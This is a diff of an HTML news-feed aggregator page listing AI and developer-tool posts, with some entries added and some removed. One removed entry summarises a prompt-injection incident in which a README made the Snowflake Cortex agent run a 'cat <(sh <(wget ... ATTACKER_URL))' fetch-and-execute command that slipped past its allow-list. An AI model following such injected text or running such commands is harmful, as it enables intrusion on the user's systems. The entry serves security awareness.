@@ -25,6 +25,32 @@
 
   <ul>
     <li>
+      <time>2026-04-17</time>
+
+      <section>
+      <article>
+          <details>
+            <summary>
+              datasette 1.0a28
+              <span class="post-metadata">(3 min | 880 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://simonwillison.net/2026/Apr/17/datasette/#atom-everything>Release: datasette 1.0a28
+I was upgrading Datasette Cloud to 1.0a27 and discovered a nasty collection of accidental breakages caused by changes in that alpha. This new alpha addresses those directly:
+Fixed a compatibility bug introduced in 1.0a27 where execute_write_fn() callbacks with a parameter name other than conn were seeing errors. (#2691)
+The database.close() method now also shuts down the write connection for that database.
+New datasette.close() method for closing down all databases and resources associated with a Datasette instance. This is called automatically when the server shuts down. (#2693)
+Datasette now includes a pytest plugin which automatically calls datasette.close() on temporary instances created in function-scoped fixtures and during tests. See Automatic cleanup of Datasette instances for details. This helps avoid running out of file descriptors in plugin test suites that were written before the Database(is_temp_disk&#x3D;True) feature introduced in Datasette 1.0a27. (#2692)
+Most of the changes in this release were implemented using Claude Code and the newly released Claude Opus 4.7.
+Tags: datasette</a>
+            </div>
+            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
+          </details>
+      </article>
+
+      </section>
+    </li>
+    <li>
       <time>2026-04-16</time>
 
       <section>
@@ -154,6 +180,18 @@ The post Claude Opus 4.7 is generally available appeared first on The GitHub Blo
               <a target="_blank" href=https://openai.com/index/codex-for-almost-everything>The updated Codex app for macOS and Windows adds computer use, in-app browsing, image generation, memory, and plugins to accelerate developer workflows.</a>
             </div>
             <!-- <p class="post-source">OpenAI News</p> -->
+          </details>
+      </article>
+      <article>
+          <details>
+            <summary>
+              qwen3.6
+              <span class="post-metadata">(8 min | 2505 words)</span> 
+            </summary>
+            <div class="post-content">
+              <a target="_blank" href=https://ollama.com/library/qwen3.6>Qwen3.6 delivers substantial upgrades in agentic coding and thinking preservation than previous Qwen models.</a>
+            </div>
+            <!-- <p class="post-source">Ollama models</p> -->
           </details>
       </article>
       <article>
@@ -5407,125 +5445,6 @@ The post Hierarchy view in GitHub Projects is now generally available appeared f
               <a target="_blank" href=https://openai.com/index/how-we-monitor-internal-coding-agents-misalignment>How OpenAI uses chain-of-thought monitoring to study misalignment in internal coding agents—analyzing real-world deployments to detect risks and strengthen AI safety safeguards.</a>
             </div>
             <!-- <p class="post-source">OpenAI News</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              OpenAI to acquire Astral
-              <span class="post-metadata">(0 min |  words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://openai.com/index/openai-to-acquire-astral>Accelerates Codex growth to power the next generation of Python developer tools</a>
-            </div>
-            <!-- <p class="post-source">OpenAI News</p> -->
-          </details>
-      </article>
-
-      </section>
-    </li>
-    <li>
-      <time>2026-03-18</time>
-
-      <section>
-      <article>
-          <details>
-            <summary>
-              Autoresearching Apple&#x27;s &quot;LLM in a Flash&quot; to run Qwen 397B locally
-              <span class="post-metadata">(4 min | 1070 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2026/Mar/18/llm-in-a-flash/#atom-everything>Autoresearching Apple&#x27;s &quot;LLM in a Flash&quot; to run Qwen 397B locally
-Qwen3.5-397B-A17B running at 5.5+ tokens/second on a 48GB MacBook Pro M3 Max despite that model taking up 209GB (120GB quantized) on disk.
-Qwen3.5-397B-A17B is a Mixture-of-Experts (MoE) model, which means that each token only needs to run against a subset of the overall model weights. These expert weights can be streamed into memory from SSD, saving them from all needing to be held in RAM at the same time.
-Dan used techniques described in Apple&#x27;s 2023 paper LLM in a flash: Efficient Large Language Model Inference with Limited Memory:
-This paper tackles the challenge of efficiently running LLMs that exceed the available DRAM capacity by storing the model parameters in flash memory, but bringing them on demand to DRAM. Our method involves constructing an inference cost model that takes into account the characteristics of flash memory, guiding us to optimize in two critical areas: reducing the volume of data transferred from flash and reading data in larger, more contiguous chunks.
-He fed the paper to Claude Code and used a variant of Andrej Karpathy&#x27;s autoresearch pattern to have Claude run 90 experiments and produce MLX Objective-C and Metal code that ran the model as efficiently as possible.
-danveloper/flash-moe has the resulting code plus a PDF paper mostly written by Claude Opus 4.6 describing the experiment in full.
-The final model has the experts quantized to 2-bit, but the non-expert parts of the model such as the embedding table and routing matrices are kept at their original precision, adding up to 5.5GB which stays resident in memory while the model is running.
-Qwen 3.5 usually runs 10 experts per token, but this setup dropped that to 4 while claiming that the biggest quality drop-off occurred at 3.
-It&#x27;s not clear to me how much the quality of the model results are affected. Claude claimed that &quot;Output quality at 2-bit is indistinguishable from 4-bit for these evaluations&quot;, but the description of the evaluations it ran is quite thin.
-
-
-    
-Tags: ai, generative-ai, local-llms, llms, qwen, mlx</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              datasette 1.0a26
-              <span class="post-metadata">(2 min | 725 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2026/Mar/18/datasette/#atom-everything>Release: datasette 1.0a26
-Datasette now has a mechanism for assigning semantic column types. Built-in column types include url, email, and json, and plugins can register additional types using the new register_column_types() plugin hook.</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Configure Copilot coding agent’s validation tools
-              <span class="post-metadata">(4 min | 1298 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2026-03-18-configure-copilot-coding-agents-validation-tools>When Copilot coding agent writes code, it automatically runs your project’s tests and linter. It also runs GitHub’s security and quality validation tools, including CodeQL, the GitHub Advisory Database, secret…
-The post Configure Copilot coding agent’s validation tools appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              minimax-m2.7
-              <span class="post-metadata">(10 min | 2919 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://ollama.com/library/minimax-m2.7>MiniMax&#x27;s M2-series model for coding, agentic workflows, and professional productivity.</a>
-            </div>
-            <!-- <p class="post-source">Ollama models</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              Snowflake Cortex AI Escapes Sandbox and Executes Malware
-              <span class="post-metadata">(3 min | 871 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://simonwillison.net/2026/Mar/18/snowflake-cortex-ai/#atom-everything>Snowflake Cortex AI Escapes Sandbox and Executes Malware
-Cortex Agent, now fixed.
-The attack started when a Cortex user asked the agent to review a GitHub repository that had a prompt injection attack hidden at the bottom of the README.
-The attack caused the agent to execute this code:
-cat &lt; &lt;(sh &lt; &lt;(wget -q0- https://ATTACKER_URL.com/bugbot))
-
-Cortex listed cat commands as safe to run without human approval, without protecting against this form of process substitution that can occur in the body of the command.
-I&#x27;ve seen allow-lists against command patterns like this in a bunch of different agent tools and I don&#x27;t trust them at all - they feel inherently unreliable to me.
-I&#x27;d rather treat agent commands as if they could do anything that process itself is allowed to do, hence my interest in deterministic sandboxes that operate outside of the layer of the agent itself.
-
-    
-Via Hacker News
-Tags: sandboxing, security, ai, prompt-injection, generative-ai, llms</a>
-            </div>
-            <!-- <p class="post-source">Simon Willison&#x27;s Weblog</p> -->
-          </details>
-      </article>
-      <article>
-          <details>
-            <summary>
-              GPT-5.3-Codex long-term support in GitHub Copilot
-              <span class="post-metadata">(5 min | 1537 words)</span> 
-            </summary>
-            <div class="post-content">
-              <a target="_blank" href=https://github.blog/changelog/2026-03-18-gpt-5-3-codex-long-term-support-in-github-copilot>To give enterprises the stability they need for internal security and safety reviews, GitHub has established a new commitment with long-term support (LTS) models available for Copilot Business and Copilot…
-The post GPT-5.3-Codex long-term support in GitHub Copilot appeared first on The GitHub Blog.</a>
-            </div>
-            <!-- <p class="post-source">Archive: 2026 - GitHub Changelog</p> -->
           </details>
       </article>
 
